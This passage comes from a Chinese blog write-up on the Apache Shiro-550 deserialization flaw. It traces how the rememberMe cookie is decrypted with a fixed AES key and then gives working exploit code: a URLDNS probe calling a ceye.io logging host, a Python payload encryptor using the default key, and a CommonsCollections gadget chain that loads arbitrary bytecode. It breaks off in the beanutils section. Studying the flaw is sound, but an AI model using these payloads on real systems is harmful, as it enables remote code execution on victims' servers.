title="&lt;2.1&gt;解密，反序列化"></a>&lt;2.1&gt;解密，反序列化</h2><ol><li><p>全局搜索cookie，找到CookieRemberMeManager的getRememberedSerializedIdentity方法</p><ul><li>从cookie中读取rememberMe的值，非deleteMe的情况下对其base64解码，返回解码结果</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">protected</span> <span class="hljs-type">byte</span>[] getRememberedSerializedIdentity(SubjectContext subjectContext) &#123;<br><br>    <span class="hljs-comment">//这里先判断是否是http请求</span><br>        <span class="hljs-keyword">if</span> (!WebUtils.isHttp(subjectContext)) &#123;<br>            <span class="hljs-keyword">if</span> (log.isDebugEnabled()) &#123;<br>                <span class="hljs-type">String</span> <span class="hljs-variable">msg</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;SubjectContext argument is not an HTTP-aware instance.  This is required to obtain a &quot;</span> +<br>                        <span class="hljs-string">&quot;servlet request and response in order to retrieve the rememberMe cookie. Returning &quot;</span> +<br>                        <span class="hljs-string">&quot;immediately and ignoring rememberMe operation.&quot;</span>;<br>                log.debug(msg);<br>            &#125;<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;<br>        &#125;<br><br>        <span class="hljs-type">WebSubjectContext</span> <span class="hljs-variable">wsc</span> <span class="hljs-operator">=</span> (WebSubjectContext) subjectContext;<br>        <span class="hljs-keyword">if</span> (isIdentityRemoved(wsc)) &#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;<br>        &#125;<br><br>        <span class="hljs-type">HttpServletRequest</span> <span class="hljs-variable">request</span> <span class="hljs-operator">=</span> WebUtils.getHttpRequest(wsc);<br>        <span class="hljs-type">HttpServletResponse</span> <span class="hljs-variable">response</span> <span class="hljs-operator">=</span> WebUtils.getHttpResponse(wsc);<br><br> <br>        <span class="hljs-type">String</span> <span class="hljs-variable">base64</span> <span class="hljs-operator">=</span> getCookie().readValue(request, response);<br>     <br>        <span class="hljs-keyword">if</span> (Cookie.DELETED_COOKIE_VALUE.equals(base64)) <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;<br><br>        <span class="hljs-keyword">if</span> (base64 != <span class="hljs-literal">null</span>) &#123;<br>            base64 = ensurePadding(base64);<br>            <span class="hljs-keyword">if</span> (log.isTraceEnabled()) &#123;<br>                log.trace(<span class="hljs-string">&quot;Acquired Base64 encoded identity [&quot;</span> + base64 + <span class="hljs-string">&quot;]&quot;</span>);<br>            &#125;<br>            <span class="hljs-type">byte</span>[] decoded = Base64.decode(base64);<br>            <span class="hljs-keyword">if</span> (log.isTraceEnabled()) &#123;<br>                log.trace(<span class="hljs-string">&quot;Base64 decoded byte array length: &quot;</span> + (decoded != <span class="hljs-literal">null</span> ? decoded.length : <span class="hljs-number">0</span>) + <span class="hljs-string">&quot; bytes.&quot;</span>);<br>            &#125;<br>            <span class="hljs-keyword">return</span> decoded;<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-comment">//no cookie set - new site visitor?</span><br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;<br>        &#125;<br>    &#125;<br></code></pre></td></tr></table></figure></li><li><p>向上查找它的用法，抽象类AbstractRememberMeManager 的          getRememberedPrincipals方法中将 调自己的函数getRememberedSerializedIdentity()的结果赋值给数组bytes(即它就是base64解码之后的结果)</p><p>然后bytes作为参数调用convertBytesToPrincipals</p><p><img src="/2025/05/23/Shiro-550/image-20250515164150697-17479864050891-174798676783953.png"></p><p>这个方法就是要解密和反序列化</p><p><img src="/2025/05/23/Shiro-550/image-20250515164810131-17479864068832.png"></p><p>先看反序列化，反序列化可以成为CC的利用之处</p><p><img src="/2025/05/23/Shiro-550/image-20250515203548786-17479864085253.png"></p><hr><blockquote><p>解密的代码</p></blockquote><p>跟进去</p><p><img src="/2025/05/23/Shiro-550/image-20250515210414603-17479864117484.png"></p><p>发现decrypt是个接口的方法，该方法的参数为：被加密的数组，还有key</p><p>那经过刚刚的分析，它传的两个参数是base64解密之后的数组和**getDecryptionCipherKey()**得到的key</p><p><img src="/2025/05/23/Shiro-550/image-20250515210500939-17479864135585.png"></p><p>找到实现了接口的具体的方法</p><p>知道它的key的话也就能构造了</p><p><img src="/2025/05/23/Shiro-550/image-20250515170534678-17479864151156.png"></p><p>来向上找它的key，跟进getDecryptionCipherKey()函数</p><p>返回的一个属性，找找哪里写的属性</p><p><img src="/2025/05/23/Shiro-550/image-20250515171024197-17479864170807.png"></p><p>找到函数里面写入了它的值，这个值是方法的参数有关，那就继续向上找哪调的方法呗</p><p><img src="/2025/05/23/Shiro-550/image-20250515171304243-17479864186778.png"></p><p>到这儿，再接着找</p><p><img src="/2025/05/23/Shiro-550/image-20250515182054122-17479864204569.png"></p><p>终于找到是与常量DEFAULT_CIPHER_KEY_BYTES有关</p><p>所以与rememberMe相关的是有一个固定的key值去加密的，注释中写到是AES加密</p><p><img src="/2025/05/23/Shiro-550/image-20250515182351807-174798642204210.png"></p><p><img src="/2025/05/23/Shiro-550/image-20250520215726365-174798642360411.png"></p></li></ol><hr><h2 id="加密，序列化"><a href="#加密，序列化" class="headerlink" title="&lt;2.2&gt;加密，序列化"></a>&lt;2.2&gt;加密，序列化</h2><p>就是同理了</p><p><img src="/2025/05/23/Shiro-550/image-20250517102742103-174798642564712.png"></p><p>找找找到序列化和加密</p><p><img src="/2025/05/23/Shiro-550/image-20250517103027793-174798643700913.png"></p><p>加密和上面的很相似，向上继续找用法</p><p><img src="/2025/05/23/Shiro-550/image-20250517103151023-174798644350414.png"></p><p><img src="/2025/05/23/Shiro-550/image-20250517103255609-174798644560415.png"></p><p>同样找到了这个常量最终的key</p><p><img src="/2025/05/23/Shiro-550/image-20250517103308063-174798644787916.png"></p><p>将序列化后加密的 Cookie 进行base64编码操作</p><p><img src="/2025/05/23/Shiro-550/image-20250517152218615-174798645396517.png"></p><p>总的来说就是要将序列化的payload aes加密再base64编码</p><hr><h1 id="三-漏洞利用"><a href="#三-漏洞利用" class="headerlink" title="三.漏洞利用"></a>三.漏洞利用</h1><p>Shiro原生的依赖里面CC是不能用的但可以手动修改pom.xml添加CC依赖，URLDNS在shiro原生的依赖里就可以用</p><h2 id="URLDNS验证"><a href="#URLDNS验证" class="headerlink" title="&lt;3.1&gt;URLDNS验证"></a>&lt;3.1&gt;URLDNS验证</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">UrlDNS</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> IOException, NoSuchFieldException, IllegalAccessException, ClassNotFoundException &#123;<br>        <span class="hljs-comment">// Person person = new Person(&quot;xiao&quot;, 18, 01);</span><br>        HashMap&lt;URL, Integer&gt; hashmap = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;URL, Integer&gt;();<br>        <span class="hljs-comment">//这里不想要发起请求，把url对象的hashcode改成不是-1就可以了</span><br>        <span class="hljs-type">URL</span> <span class="hljs-variable">url</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">URL</span>(<span class="hljs-string">&quot;http://be5fsm.ceye.io&quot;</span>);<br>        <span class="hljs-type">Class</span> <span class="hljs-variable">c</span> <span class="hljs-operator">=</span> url.getClass();<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">hashcodefield</span> <span class="hljs-operator">=</span> c.getDeclaredField(<span class="hljs-string">&quot;hashCode&quot;</span>);<br>        hashcodefield.setAccessible(<span class="hljs-literal">true</span>);<br>        hashcodefield.set(url, <span class="hljs-number">1234</span>);<br>        hashmap.put(url, <span class="hljs-number">1</span>);<span class="hljs-comment">//不改变的话在put的时候就已经调用hash,key的hashCode方法了，已经发送dns请求了</span><br>        <span class="hljs-comment">//这里把hashCode改回-1</span><br>        <span class="hljs-comment">//通过反射改变已有对象的属性</span><br>        hashcodefield.set(url, -<span class="hljs-number">1</span>);<br>        serialize(hashmap);<br>     <span class="hljs-comment">//   unserialize(&quot;ser.bin&quot;);</span><br><br>    &#125;<br></code></pre></td></tr></table></figure><p>用脚本将ser.bin文件中序列化后的payloadAES加密base64编码</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><code class="hljs python"><br><span class="hljs-keyword">from</span> email.mime <span class="hljs-keyword">import</span> base<br><span class="hljs-keyword">from</span> pydoc <span class="hljs-keyword">import</span> plain<br><span class="hljs-keyword">import</span> sys<br><span class="hljs-keyword">import</span> base64<br><span class="hljs-keyword">from</span> turtle <span class="hljs-keyword">import</span> mode<br><span class="hljs-keyword">import</span> uuid<br><span class="hljs-keyword">from</span> random <span class="hljs-keyword">import</span> Random<br><span class="hljs-keyword">from</span> Crypto.Cipher <span class="hljs-keyword">import</span> AES<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">get_file_data</span>(<span class="hljs-params">filename</span>):<br> <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(filename, <span class="hljs-string">&#x27;rb&#x27;</span>) <span class="hljs-keyword">as</span> f:<br>    data = f.read()<br> <span class="hljs-keyword">return</span> data<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">aes_enc</span>(<span class="hljs-params">data</span>):<br> BS = AES.block_size<br> pad = <span class="hljs-keyword">lambda</span> s: s + ((BS - <span class="hljs-built_in">len</span>(s) % BS) * <span class="hljs-built_in">chr</span>(BS - <span class="hljs-built_in">len</span>(s) % BS)).encode()<br> key = <span class="hljs-string">&quot;kPH+bIxk5D2deZiIxcaaaA==&quot;</span><br> mode = AES.MODE_CBC<br> iv = uuid.uuid4().<span class="hljs-built_in">bytes</span><br> encryptor = AES.new(base64.b64decode(key), mode, iv)<br> ciphertext = base64.b64encode(iv + encryptor.encrypt(pad(data)))<br> <span class="hljs-keyword">return</span> ciphertext<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">aes_dec</span>(<span class="hljs-params">enc_data</span>):<br> enc_data = base64.b64decode(enc_data)<br> unpad = <span class="hljs-keyword">lambda</span> s: s[:-s[-<span class="hljs-number">1</span>]]<br> key = <span class="hljs-string">&quot;kPH+bIxk5D2deZiIxcaaaA==&quot;</span><br> mode = AES.MODE_CBC<br> iv = enc_data[:<span class="hljs-number">16</span>]<br> encryptor = AES.new(base64.b64decode(key), mode, iv)<br> plaintext = encryptor.decrypt(enc_data[<span class="hljs-number">16</span>:])<br> plaintext = unpad(plaintext)<br> <span class="hljs-keyword">return</span> plaintext<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:<br> data = get_file_data(<span class="hljs-string">&quot;ser.bin&quot;</span>)<br> <span class="hljs-built_in">print</span>(aes_enc(data))<br><br></code></pre></td></tr></table></figure><p><img src="/2025/05/23/Shiro-550/image-20250517165210623-174798646041518.png"></p><p>然后换掉rememberMe就好了，注意要删除JSESSIONID</p><p><img src="/2025/05/23/Shiro-550/image-20250521153421542-174798646332319.png"></p><p><img src="/2025/05/23/Shiro-550/image-20250521153443860.png" alt="image-20250521153443860"></p><h2 id="CC2-CC3-CC6"><a href="#CC2-CC3-CC6" class="headerlink" title="&lt;3.2&gt;CC2+CC3+CC6"></a>&lt;3.2&gt;CC2+CC3+CC6</h2><blockquote><p>单独CC2需要CC4版本     PriorityQueue这个类是commons-collections4才有的类，</p></blockquote><h3 id="1-分析CC6无法用："><a href="#1-分析CC6无法用：" class="headerlink" title="1.分析CC6无法用："></a>1.分析CC6无法用：</h3><p>cc6报错了，无法加载Transformer数组</p><p><img src="/2025/05/23/Shiro-550/image-20250518163615139-174798646565020.png"></p><p><strong>原因分析：</strong></p><p>在反序列化这里不是用的原生的ObjectInputStream的readObject()</p><p><img src="/2025/05/23/Shiro-550/image-20250518204555315-174798646744521.png"></p><p>反序列化过程中会涉及到resolveClass()，在这儿有不同</p><p>在这里ClassResolvingObjectInputStream 为 shiro 框架实现的自定义类，重写的resolveClass中用到ClassUtils.forName()</p><p>原生的resolveClass用到Class.forName()</p><p>对比见下图：</p><p><img src="/2025/05/23/Shiro-550/image-20250518205139690-174798647000722.png"></p><p><img src="/2025/05/23/Shiro-550/image-20250518205057512-174798647168423.png"></p><p>具体看一下这里用的ClassUtils.forName()</p><p>由注释可知它是现有的类加载器，当前类的(即 ClassUtils 类)类加载器，一系统类加载器，加载jdk里面的，是加载不到CC依赖的</p><p><img src="/2025/05/23/Shiro-550/image-20250520144151474-174798647351124.png"></p><p>跟进去发现是WebappClassLoader加载</p><p><img src="/2025/05/23/Shiro-550/image-20250519203627473-174798647540225.png"></p><p>WebappClassLoader.loadClass</p><p>是从tomcat缓存里面找，jdk缓存里面找，然后直接EXT加载</p><p>tomcat跳过App直接到EXT，不走双亲委派</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">//加载链</span><br>WebAppClassLoader → ExtClassLoader → Bootstrap ClassLoader<br></code></pre></td></tr></table></figure><p>tomcat内部加载机制</p><p><img src="/2025/05/23/Shiro-550/image-20250519202103200-174798647822726.png"></p><p><strong>现象：</strong></p><p>Class.forName会解析数组类型，ClassLoader.findClass不会解析数组(原因：在(4))</p><p><strong>归根结底tomcatj加载类</strong>：</p><p><strong>如果反序列化流中包含非 Java 自身的数组(非String[], byte[]等)，则会出现无法加载类的错误。</strong></p><p>（1）先在本地 cache 缓存中查找该类是否已经加载过，看看 Tomcat 有没有加载过这个类</p><p>（2）如果 Tomcat 没有加载过这个类，则从系统类加载器的 cache 缓存中查找是否加载过</p><p>（3）如果没有，则使用 ExtClassLoader 类加载器类加载，重点来了，Tomcat 的 WebAppClassLoader 并没有先使用 AppClassLoader 来加载类，<strong>而是直接使用了 ExtClassLoader 来加载类</strong>。不过 ExtClassLoader 依然遵循双亲委派，它会使用 Bootstrap ClassLoader 来对类进行加载，保证了 Jre 里面的核心类不会被重复加载。</p><p>（4）如果没有加载成功，WebAppClassLoader 就会调用自己的 <strong>findClass()</strong> 方法由自己来对类进行加载，先在 WEB-INF&#x2F;classes 中加载，再从 WEB-INF&#x2F;lib 中加载。**<u><em>就是在这里加载不到数组类的</em></u>**</p><ul><li><p>在目录WEB-INF下的类(它自己的)是由findClass加载的（与UrlClassLoader.findClass逻辑是差不多的，都转换了路径）</p><ul><li><p>findClass加载：类名加个.class后缀转换成文件路径，再去调defineClass加载文件</p><p>这里数组类Transformer加上.class是没有这个文件的，所以这是它真正就加载不到的原因</p><p><img src="/2025/05/23/Shiro-550/image-20250520204411604-174798648170527.png"></p></li></ul></li></ul><p>其它是由jdk 的Class.forName()加载的，不会做路径转换</p><p>（5）如果仍然未加载成功，WebAppclassLoader 会委派给 SharedClassLoader，SharedClassLoad 再委派给 CommonClassLoader，CommonClassLoader 委派给 AppClassLoader，直到最终委派给 BootstrapClassLoader，最后再一层一层地在自己目录下对类进行加载。</p><p>原文链接：<a href="https://blog.csdn.net/a745233700/article/details/120802616">https://blog.csdn.net/a745233700/article/details/120802616</a></p><hr><h3 id="2-CC6-CC2-CC3的利用"><a href="#2-CC6-CC2-CC3的利用" class="headerlink" title="2.CC6+CC2+CC3的利用"></a>2.CC6+CC2+CC3的利用</h3><p>我们CC6数组是不能用了(用数组也是因为要借助ConstantTransformer,给transform方法传参)</p><ul><li><p>回顾之前学过的链子里面<strong>能控制最后transformer(arg)中参数arg</strong>的就只有CC6&amp;&amp;CC3.4.2</p><ul><li><p>具体体现：<br>CC6中TiedMapEntry构造器中的key就是TiedMapEntry.getValue(key).(map.transform(key))</p><p>CC4.3.2中PriorityQueue.add()的参数会传到TransformingComparator.compare.(comparator.transform(args))</p></li></ul></li></ul><p>所以下面我们就构造CC6+CC2+CC3的利用</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> org.example;<br><br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.map.LazyMap;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;<br><br><span class="hljs-keyword">import</span> java.io.*;<br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.nio.file.Files;<br><span class="hljs-keyword">import</span> java.nio.file.Paths;<br><span class="hljs-keyword">import</span> java.util.HashMap;<br><span class="hljs-keyword">import</span> java.util.Map;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">CC6_CC2</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> NoSuchFieldException, IOException, IllegalAccessException, ClassNotFoundException &#123;<br><br>        <span class="hljs-comment">//CC3</span><br>        <span class="hljs-type">TemplatesImpl</span> <span class="hljs-variable">templates</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TemplatesImpl</span>();<br>        Class&lt;TemplatesImpl&gt; c1 = TemplatesImpl.class;<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">name</span> <span class="hljs-operator">=</span> c1.getDeclaredField(<span class="hljs-string">&quot;_name&quot;</span>);<br>        name.setAccessible(<span class="hljs-literal">true</span>);<br>        name.set(templates,<span class="hljs-string">&quot;aaa&quot;</span>);<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">tfactory</span> <span class="hljs-operator">=</span> c1.getDeclaredField(<span class="hljs-string">&quot;_tfactory&quot;</span>);<br>        tfactory.setAccessible(<span class="hljs-literal">true</span>);<br>        tfactory.set(templates,<span class="hljs-keyword">new</span> <span class="hljs-title class_">TransformerFactoryImpl</span>());<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">bytecodes</span> <span class="hljs-operator">=</span> c1.getDeclaredField(<span class="hljs-string">&quot;_bytecodes&quot;</span>);<br>        bytecodes.setAccessible(<span class="hljs-literal">true</span>);<br>        <span class="hljs-type">byte</span>[] code= Files.readAllBytes(Paths.get(<span class="hljs-string">&quot;D://Security/java/tmp/classes/Test_.class&quot;</span>));<br>        <span class="hljs-type">byte</span>[][]codes=&#123;code&#125;;<br>        bytecodes.set(templates,codes);<br>       <br>        <br>        <span class="hljs-comment">//CC2</span><br>        <span class="hljs-type">InvokerTransformer</span> <span class="hljs-variable">invokerTransformer</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;newTransformer&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;&#125;);<br><br>        <br>        <span class="hljs-comment">//CC6</span><br>        <span class="hljs-type">HashMap</span> <span class="hljs-variable">map</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>();<span class="hljs-comment">//这儿的map  key值为空</span><br>        Map lazymap=  LazyMap.decorate(map,<span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>(<span class="hljs-number">1</span>));<br>        <span class="hljs-type">TiedMapEntry</span> <span class="hljs-variable">tiedMapEntry</span> <span class="hljs-operator">=</span><span class="hljs-keyword">new</span> <span class="hljs-title class_">TiedMapEntry</span>(lazymap,templates);<br>        <span class="hljs-type">HashMap</span> <span class="hljs-variable">map2</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>();<br>        map2.put(tiedMapEntry, <span class="hljs-string">&quot;bbb&quot;</span>);<br>        map.remove(templates);<br>        Class&lt;LazyMap&gt; c = LazyMap.class;<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">factory</span> <span class="hljs-operator">=</span> c.getDeclaredField(<span class="hljs-string">&quot;factory&quot;</span>);<br>        factory.setAccessible(<span class="hljs-literal">true</span>);<br>        factory.set(lazymap,invokerTransformer);<br>        serialize(map2);<br>        unserialize(<span class="hljs-string">&quot;ser.bin&quot;</span>);<br><br><br>&#125;<br><br><br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">serialize</span> <span class="hljs-params">(Object o)</span> <span class="hljs-keyword">throws</span> IOException &#123;<br>    <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">oos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileOutputStream</span>(<span class="hljs-string">&quot;ser.bin&quot;</span>));<br>    oos.writeObject(o);<br>&#125;<br><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Object <span class="hljs-title function_">unserialize</span> <span class="hljs-params">(String filename)</span> <span class="hljs-keyword">throws</span> IOException, ClassNotFoundException &#123;<br>    <span class="hljs-type">ObjectInputStream</span> <span class="hljs-variable">ois</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileInputStream</span>(filename));<br>    <span class="hljs-type">Object</span> <span class="hljs-variable">obj</span> <span class="hljs-operator">=</span> ois.readObject();<br>    <span class="hljs-keyword">return</span> obj;<br>&#125;<br><br>&#125;<br><br></code></pre></td></tr></table></figure><p>然后还是序列化后AES加密，base64编码替换rememberMe</p><p><img src="/2025/05/23/Shiro-550/image-20250521152614958-174798648569328.png"></p><h2 id="commons-beanutils-1-8-3"><a href="#commons-beanutils-1-8-3" class="headerlink" title="&lt;3.3&gt;commons-beanutils-1.8.3"></a>&lt;3.3&gt;commons-beanutils-1.8.3</h2><p><strong>JavaBean</strong></p><ul><li>这个Java类必须具有一个无参的构造函数</li><li>属性必须私有化。</li><li>私有化的属性必须通过public类型的方法暴露给其它程序，并且方法的命名也必须遵守一定的命名规范。</li></ul><p><strong>引入：</strong></p><p><strong>PropertyUtils.getProperty它动态调了方法，存在安全风险</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">BeanTest</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> InvocationTargetException, IllegalAccessException, NoSuchMethodException &#123;<br>        <span class="hljs-type">Person</span> <span class="hljs-variable">person</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Person</span>(<span class="hljs-string">&quot;aaa&quot;</span>,<span class="hljs-number">18</span>);<br>        System.out.println(PropertyUtils.getProperty(person,<span class="hljs-string">&quot;age&quot;</span>));<br>        <span class="hljs-comment">//动态执行代码</span><br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><h3 id="1-底层实现分析"><a href="#1-底层实现分析" class="headerlink" title="1.底层实现分析"></a>1.底层实现分析</h3><p>调另一个类PropertyUtilsBean对象的getProperty，接着走到getNestedProperty方法</p><p><img src="/2025/05/23/Shiro-550/image-20250521201413176-174798648831429.png"></p><p><img src="/2025/05/23/Shiro-550/image-20250521201840388-174798648969230.png"></p><p>这个方法里面接着调getSimpleProperty方法</p><p><img src="/2025/05/23/Shiro-550/image-20250521202520425-174798649150231.png"></p><p>接着这个方法里面获取到一个属性描述符descriptor</p><p><img src="/2025/05/23/Shiro-550/image-20250521203001985-174798649353832.png"></p><p>得到descriptor后，获得属性的名字(驼峰命名)，get，set方法</p><p><img src="/2025/05/23/Shiro-550/image-20250521203357747-174798649535233.png"></p><p>重点是这里，获得方法后反射调用bean对象符合javaBean格式的方法</p><p><img src="/2025/05/23/Shiro-550/image-20250521203824546-174798649705234.png"></p><p><img src="/2025/05/23/Shiro-550/image-20250521204200840-174798649854235.png"></p><p>在之前见过的TemplatesImpl中存在两处可利用点，可以作为切入点，将javaBean连接到利用链上</p><ul><li>getOutputProperties是符合javaBean格式的，它还调了newTransformer刚刚好可以接上之前的利用链</li></ul><p><img src="/2025/05/23/Shiro-550/image-20250521204700097-174798650028836.png"></p><p><img src="/2025/05/23/Shiro-550/image-20250521210055303-174798650236837.png"></p><h3 id="2-具体构造过程"><a href="#2-具体构造过程" class="headerlink" title="2.具体构造过程"></a>2.具体构造过程</h3><p>PropertyUtils.getProperty调TemplatesImpl的私有属性outputProperties的话，就会动态调到TemplatesImpl的getOutputProperties方法，接着方法里面(CC3)还调了newTransformer加载类</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs java"><br><span class="hljs-type">TemplatesImpl</span> <span 